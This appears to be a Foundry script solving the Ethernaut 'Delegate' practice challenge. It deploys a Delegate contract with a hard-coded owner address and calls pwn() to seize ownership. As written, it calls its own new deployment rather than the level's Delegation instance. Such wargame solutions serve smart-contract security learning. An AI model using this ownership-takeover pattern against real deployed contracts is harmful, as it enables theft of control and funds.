// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Delegate} from "../../src/Ethernaut/Delegate.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Delegate delegate = new Delegate(0xBb279ecacAEEd889DE139aa17D2bB682900Ed593);
        (bool success,) = address(delegate).call(abi.encodeWithSignature("pwn()"));
        require(success, "fail");
        vm.stopBroadcast();
    }
}
